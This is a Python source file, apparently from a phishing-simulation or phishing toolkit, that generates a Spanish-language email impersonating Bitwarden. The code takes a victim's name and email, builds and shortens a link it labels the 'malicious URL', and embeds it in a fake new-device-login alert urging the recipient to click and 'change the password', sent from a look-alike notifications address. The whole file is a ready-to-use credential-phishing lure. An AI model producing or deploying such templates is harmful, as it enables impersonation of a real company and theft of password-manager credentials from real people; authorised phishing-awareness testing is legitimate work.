from helper.helper import saveTemplateGenerated,get_input_es, urlShorter

def bitdefender_es():
    userName,url,userEmail,currentDate=get_input_es()
    ##HTML suplantacion bbva
    print("\nGenerando suplantación de bitdefender...")
    print("\nDatos de las víctimas utilizados para este ataque:\n[Usuario]:"+userName+"\n[Email]:"+userEmail)
    urlShort=urlShorter(url+userName)
    print("\n[Url Maliciosa]:"+url+userName+"\n[Url Acortada]:"+urlShort)
    
    docusignHtml=("""
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
</head>

<body>
	<table class="Table" style="width:100.0%; background:#f6f6f6; border:undefined" width="100%">
		<tbody>
			<tr>
				<td style="background:#f6f6f6; width:100.0%; padding:0cm 0cm 0cm 0cm" width="100%">
					<table align="center" class="Table" style="width:100.0%; border:undefined" width="100%">
						<tbody>
							<tr>
								<td style="padding:0cm 0cm 0cm 0cm">&nbsp;</td>
								<td style="width:450.0pt; padding:0cm 0cm 15.0pt 0cm" valign="top" width="600">
									<table align="center" class="Table" style="width:100.0%; border:undefined"
										width="100%">
										<tbody>
											<tr>
												<td style="padding:15.0pt 0cm 7.5pt 0cm">
													<p align="center" style="text-align:center"><span
															style="font-size:11pt"><span
																style="line-height:18.75pt"><span
																	style="font-family:Calibri,sans-serif"><img
																		id="_x0000_i1025"
																		src="https://s3testbucketganoro.s3.eu-west-1.amazonaws.com/image/bitwarden.png"
																		style="width:300px; height:100px"></span></span></span>
													</p>
												</td>
											</tr>
										</tbody>
									</table>

									<p align="center" style="text-align:center">&nbsp;</p>

									<table align="center" class="Table"
										style="background:white; border:none; border-radius:3px">
										<tbody>
											<tr
												style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">
												<td style="border:none; background:white; padding:15.0pt 15.0pt 15.0pt 15.0pt"
													valign="top">
													<table class="Table"
														style="width:100.0%; box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none; border:undefined"
														width="100%">
														<tbody>
															<tr
																style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">
																<td style="padding:0cm 0cm 7.5pt 0cm" valign="top">
																	<p><span style="box-sizing:border-box"><span
																				style="-webkit-font-smoothing:antialiased"><span
																					style="-webkit-text-size-adjust:none"><span
																						style="box-sizing:border-box"><span
																							style="-webkit-font-smoothing:antialiased"><span
																								style="-webkit-text-size-adjust:none"><span
																									style="font-size:11pt"><span
																										style="line-height:18.75pt"><span
																											style="font-family:Calibri,sans-serif"><span
																												style="font-size:12.0pt"><span
																													style="font-family:&quot;Helvetica&quot;,sans-serif"><span
																														style="color:#333333">Su cuenta de Bitwarden acaba de ser iniciada 
																														desde un nuevo dispositivo.
																													</span></span></span></span></span></span></span></span></span></span></span></span>
																	</p>
																</td>
															</tr>
															<tr
																style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">
																<td style="padding:0cm 0cm 7.5pt 0cm" valign="top">
																	<p><span style="box-sizing:border-box"><span
																				style="-webkit-font-smoothing:antialiased"><span
																					style="-webkit-text-size-adjust:none"><span
																						style="box-sizing:border-box"><span
																							style="-webkit-font-smoothing:antialiased"><span
																								style="-webkit-text-size-adjust:none"><span
																									style="font-size:11pt"><span
																										style="line-height:18.75pt"><span
																											style="font-family:Calibri,sans-serif"><b
																												style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none"><span
																													style="font-size:12.0pt"><span
																														style="font-family:&quot;Helvetica&quot;,sans-serif"><span
																															style="color:#333333">Date:</span></span></span></b><span
																												style="font-size:12.0pt"><span
																													style="font-family:&quot;Helvetica&quot;,sans-serif"><span
																														style="color:#333333"
																														translate="no">
																														{}<br
																															style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">
																														<b
																															style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">
																															Dirección IP:</b>
																														58.186.152.130<br
																															style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">
																														<b
																															style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">Tipo de dispositivo:</b>
																														Chrome
																													</span></span></span></span></span></span></span></span></span></span></span></span>
																	</p>
																</td>
															</tr>
															<tr
																style="box-sizing:border-box; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none">
																<td style="padding:0cm 0cm 0cm 0cm" valign="top">
																	<p><span style="box-sizing:border-box"><span
																				style="-webkit-font-smoothing:antialiased"><span
																					style="-webkit-text-size-adjust:none"><span
																						style="box-sizing:border-box"><span
																							style="-webkit-font-smoothing:antialiased"><span
																								style="-webkit-text-size-adjust:none"><span
																									style="font-size:11pt"><span
																										style="line-height:18.75pt"><span
																											style="font-family:Calibri,sans-serif"><span
																												style="font-size:12.0pt"><span
																													style="font-family:&quot;Helvetica&quot;,sans-serif"><span
																														style="color:#333333">Puedes desautorizar todos los dispositivos que tienen
																														acceso a tu cuenta desde el 
																														<a clicktracking="off"
																															href="{}"
																															style="-webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none; box-sizing:border-box; color:blue; text-decoration:underline"><span
																																style="color:#175ddc">valor web</span></a>
																														en 
																														Ajustes
																														|&nbsp;Mi
																														Cuenta
																														|&nbsp;Desautorizar 
																														Sesiones
																														O
																														<a
																															href="{}"><span
																																style="color:#175ddc">Haz click aquí</span></a>,
																														Para realizar automaticamente un cambio de contraseña.
																														</span></span></span></span></span></span></span></span></span></span></span></span>
																	</p>
																</td>
															</tr>
														</tbody>
													</table>
												</td>
											</tr>
										</tbody>
									</table>

									<p align="center" style="text-align:center">&nbsp;</p>

									<table align="center" class="Table" style="width:100.0%; border:undefined"
										width="100%">
										<tbody>
											<tr>
												<td style="padding:11.25pt 0cm 0cm 0cm" valign="top">
													<table align="center" class="Table" style="border:undefined">
														<tbody>
															<tr>
																<td style="padding:0cm 7.5pt 0cm 7.5pt" valign="top">
																	<p><span style="font-size:11pt"><span
																				style="line-height:18.75pt"><span
																					style="font-family:Calibri,sans-serif"><a
																						href="javascript:;window.parent.$('#webModal').modal('show');"
																						style="color:blue; text-decoration:underline"><span
																							style="text-decoration:none"><span
																								style="text-underline:none"><img
																									alt="Twitter"
																									id="_x0000_i1026"
																									src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/bitwarden/mail-twitter.png"
																									style="width:30px; height:30px"></span></span></a></span></span></span>
																	</p>
																</td>
																<td style="padding:0cm 7.5pt 0cm 7.5pt" valign="top">
																	<p><span style="font-size:11pt"><span
																				style="line-height:18.75pt"><span
																					style="font-family:Calibri,sans-serif"><a
																						href="javascript:;window.parent.$('#webModal').modal('show');"
																						style="color:blue; text-decoration:underline"><span
																							style="text-decoration:none"><span
																								style="text-underline:none"><img
																									alt="Reddit"
																									id="_x0000_i1027"
																									src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/bitwarden/mail-reddit.png"
																									style="width:30px; height:30px"></span></span></a></span></span></span>
																	</p>
																</td>
																<td style="padding:0cm 7.5pt 0cm 7.5pt" valign="top">
																	<p><span style="font-size:11pt"><span
																				style="line-height:18.75pt"><span
																					style="font-family:Calibri,sans-serif"><a
																						href="javascript:;window.parent.$('#webModal').modal('show');"
																						style="color:blue; text-decoration:underline"><span
																							style="text-decoration:none"><span
																								style="text-underline:none"><img
																									alt="CommunityForums"
																									id="_x0000_i1028"
																									src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/bitwarden/mail-discourse.png"
																									style="width:30px; height:30px"></span></span></a></span></span></span>
																	</p>
																</td>
																<td style="padding:0cm 7.5pt 0cm 7.5pt" valign="top">
																	<p><span style="font-size:11pt"><span
																				style="line-height:18.75pt"><span
																					style="font-family:Calibri,sans-serif"><a
																						href="javascript:;window.parent.$('#webModal').modal('show');"
																						style="color:blue; text-decoration:underline"><span
																							style="text-decoration:none"><span
																								style="text-underline:none"><img
																									alt="GitHub"
																									id="_x0000_i1029"
																									src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/bitwarden/mail-github.png"
																									style="width:30px; height:30px"></span></span></a></span></span></span>
																	</p>
																</td>
																<td style="padding:0cm 7.5pt 0cm 7.5pt" valign="top">
																	<p><span style="font-size:11pt"><span
																				style="line-height:18.75pt"><span
																					style="font-family:Calibri,sans-serif"><a
																						href="javascript:;window.parent.$('#webModal').modal('show');"
																						style="color:blue; text-decoration:underline"><span
																							style="text-decoration:none"><span
																								style="text-underline:none"><img
																									alt="Youtube"
																									id="_x0000_i1030"
																									src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/bitwarden/mail-youtube.png"
																									style="width:30px; height:30px"></span></span></a></span></span></span>
																	</p>
																</td>
																<td style="padding:0cm 7.5pt 0cm 7.5pt" valign="top">
																	<p><span style="font-size:11pt"><span
																				style="line-height:18.75pt"><span
																					style="font-family:Calibri,sans-serif"><a
																						href="javascript:;window.parent.$('#webModal').modal('show');"
																						style="color:blue; text-decoration:underline"><span
																							style="text-decoration:none"><span
																								style="text-underline:none"><img
																									alt="LinkedIn"
																									id="_x0000_i1031"
																									src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/bitwarden/mail-linkedin.png"
																									style="width:30px; height:30px"></span></span></a></span></span></span>
																	</p>
																</td>
																<td style="padding:0cm 7.5pt 0cm 7.5pt" valign="top">
																	<p><span style="font-size:11pt"><span
																				style="line-height:18.75pt"><span
																					style="font-family:Calibri,sans-serif"><a
																						href="javascript:;window.parent.$('#webModal').modal('show');"
																						style="color:blue; text-decoration:underline"><span
																							style="text-decoration:none"><span
																								style="text-underline:none"><img
																									alt="Facebook"
																									id="_x0000_i1032"
																									src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/bitwarden/mail-facebook.png"
																									style="width:30px; height:30px"></span></span></a></span></span></span>
																	</p>
																</td>
															</tr>
														</tbody>
													</table>
												</td>
											</tr>
											<tr>
												<td style="padding:11.25pt 0cm 0cm 0cm" valign="top">
													<p align="center" style="text-align:center"><span
															style="box-sizing:border-box"><span
																style="-webkit-font-smoothing:antialiased"><span
																	style="-webkit-text-size-adjust:none"><span
																		style="font-size:11pt"><span
																			style="line-height:18.75pt"><span
																				style="font-family:Calibri,sans-serif"><span
																					style="font-size:10.5pt"><span
																						style="font-family:&quot;Helvetica&quot;,sans-serif"><span
																							style="color:#666666">© 2024
																							Bitwarden Inc.
																						</span></span></span></span></span></span></span></span></span>
													</p>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
								<td style="padding:0cm 0cm 0cm 0cm">&nbsp;</td>
							</tr>
						</tbody>
					</table>
				</td>
			</tr>
		</tbody>
	</table>
	<style>
		a {
			cursor: pointer;
		}
	</style>
</body>

</html>
                          """).format(currentDate,urlShort,urlShort)
    saveTemplateGenerated(userName,"Bitwarden",docusignHtml,"Recuperación de tu cuenta","notificaciones@movicoders.link",userEmail)
    